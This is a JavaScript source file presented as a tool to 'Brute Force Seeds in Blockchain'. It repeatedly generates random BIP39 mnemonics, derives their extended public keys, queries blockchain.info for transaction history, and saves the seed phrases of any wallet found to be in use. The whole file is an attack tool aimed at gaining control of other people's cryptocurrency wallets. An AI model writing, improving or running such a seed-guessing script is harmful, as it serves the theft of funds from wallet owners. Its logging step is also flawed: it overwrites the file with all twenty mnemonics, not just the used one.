/*
* Brute Force Seeds in Blockchain
* When find a used seed save in logs.txt
* email@brunodasilva.com
*/
var bitcoin = require('bitcoinjs-lib')
var bip39 = require('bip39')
var bip32 = require('bip32')
var blockchain = require('blockchain.info')
var blockexplorer = require('blockchain.info/blockexplorer').usingNetwork(0)
var crypto = require('crypto')
var fs = require('fs')

setInterval(function() {
  var mnemonics = []
  var bip32Roots = []
  var xPubKeys = []
  for(var i = 0; i < 20; i++) {
      mnemonics[i] = bip39.entropyToMnemonic(crypto.randomBytes(16).toString('hex'))
      bip32Roots[i] = bip32.fromSeed(bip39.mnemonicToSeed( mnemonics[i] , ""))
      xPubKeys[i] = calcBip32ExtendedKey(bip32Roots[i], "m/44'/0'/0'")
  }
  blockexplorer.getMultiAddress(xPubKeys, {}).then(function(valor) {
    if(valor && valor.wallet && valor.wallet.n_tx > 0) {
      fs.writeFileSync("logs.txt", mnemonics.join("\r\n"))
    }
  }).catch(function(err) {
      console.log(err)
  })
}, 700)



/*
* calcBip32ExtendedKey
* Get extendedkey by path/rootKey
* Original function by Ian Coleman
 */
function calcBip32ExtendedKey(bip32RootKey, path) {
  var extendedKey = bip32RootKey;
  var pathBits = path.split("/");
  for (var i=0; i<pathBits.length; i++) {
    var bit = pathBits[i];
    var index = parseInt(bit);
    if (isNaN(index)) {
      continue;
    }
    var hardened = bit[bit.length-1] == "'";
    var isPriv = !(extendedKey.isNeutered());
    var invalidDerivationPath = hardened && !isPriv;
    if (invalidDerivationPath) {
      extendedKey = null;
    }
    else if (hardened) {
      extendedKey = extendedKey.deriveHardened(index);
    }
    else {
      extendedKey = extendedKey.derive(index);
    }
  }
  return  extendedKey.neutered().toBase58()
}
